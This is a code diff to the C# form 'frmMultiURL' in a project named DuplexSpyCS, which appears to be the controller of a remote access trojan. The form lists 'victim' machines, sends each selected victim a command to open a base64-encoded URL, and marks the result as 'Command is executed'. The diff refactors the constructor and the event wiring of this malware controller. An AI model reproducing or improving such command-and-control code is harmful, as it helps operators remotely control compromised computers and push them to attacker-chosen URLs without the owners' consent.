@@ -12,16 +12,20 @@ namespace DuplexSpyCS
 {
     public partial class frmMultiURL : Form
     {
-        public frmMain frmMain;
-        public List<clsVictim> m_lsVictim;
+        private List<clsVictim> m_lsVictim { get; init; }
         private int nCnt = 0;
 
-        public frmMultiURL()
+        public frmMultiURL(List<clsVictim> lsVictim)
         {
             InitializeComponent();
+
+            m_lsVictim = lsVictim;
+
+            StartPosition = FormStartPosition.CenterScreen;
+            Text = $"MultiURL[{lsVictim.Count}]";
         }
 
-        void Received(clsTcpListener l, clsVictim v, string[] cmd)
+        void fnRecv(clsListener listener, clsVictim v, List<string> cmd)
         {
             if (cmd[0] == "exec")
             {
@@ -30,51 +34,40 @@ namespace DuplexSpyCS
                     if (cmd[2] == "open")
                     {
                         int nCode = int.Parse(cmd[3]);
-                        UpdateStatus(v, nCode);
+
+                        Invoke(new Action(() =>
+                        {
+                            ListViewItem item = listView1.FindItemWithText(v.ID);
+                            if (item == null)
+                                return;
+
+                            if (nCode == 0)
+                            {
+                                item.SubItems[1].Text = "Failed";
+                            }
+                            else
+                            {
+                                item.SubItems[1].Text = "Command is executed, please check.";
+                            }
+                        }));
                     }
                 }
             }
-        }
-
-        public void UpdateStatus(clsVictim v, int nCode)
-        {
-            Invoke(new Action(() =>
-            {
-                string szID = v.ID;
-                ListViewItem item = listView1.FindItemWithText(szID);
-                if (item != null && nCode == 1)
-                {
-                    item.SubItems[1].Text = "OK";
-                    nCnt++;
-
-                    if (nCnt == m_lsVictim.Count)
-                    {
-                        button1.Enabled = true;
-                        MessageBox.Show("Action successfully.", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
-                    }
-                }
-            }));
         }
 
         void setup()
         {
-            if (m_lsVictim == null)
-            {
-                MessageBox.Show("m_lsVictim is null.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                Close();
-            }
-
-            foreach (clsVictim v in m_lsVictim)
+            foreach (var v in m_lsVictim)
             {
                 ListViewItem item = new ListViewItem(v.ID);
                 item.SubItems.Add("?");
                 item.Tag = v;
                 listView1.Items.Add(item);
+
+                v.m_listener.ReceivedDecoded += fnRecv;
             }
 
             toolStripStatusLabel1.Text = $"Victim[{m_lsVictim.Count}]";
-
-            //frmMain.listener.ReceivedDecoded += Received;
         }
 
         private void frmMultiURL_Load(object sender, EventArgs e)
@@ -84,27 +77,28 @@ namespace DuplexSpyCS
 
         private void button1_Click(object sender, EventArgs e)
         {
-            button1.Enabled = false;
             nCnt = 0;
 
             int nThd = (int)numericUpDown1.Value;
             string szURL = textBox1.Text;
-            ThreadPool.SetMinThreads(1, 1);
-            ThreadPool.SetMaxThreads(nThd, nThd);
 
             foreach (ListViewItem item in listView1.CheckedItems)
             {
                 clsVictim v = (clsVictim)item.Tag;
-                ThreadPool.QueueUserWorkItem(x =>
+                v.fnSendCommand(new string[]
                 {
-                    v.SendCommand($"exec|url|open|" + clsCrypto.b64E2Str(szURL));
+                    "exec",
+                    "url",
+                    "open",
+                    clsCrypto.b64E2Str(szURL),
                 });
             }
         }
 
         private void frmMultiURL_FormClosed(object sender, FormClosedEventArgs e)
         {
-            //frmMain.listener.ReceivedDecoded -= Received;
+            foreach (var victim in m_lsVictim)
+                victim.m_listener.ReceivedDecoded -= fnRecv;
         }
 
         //Check All
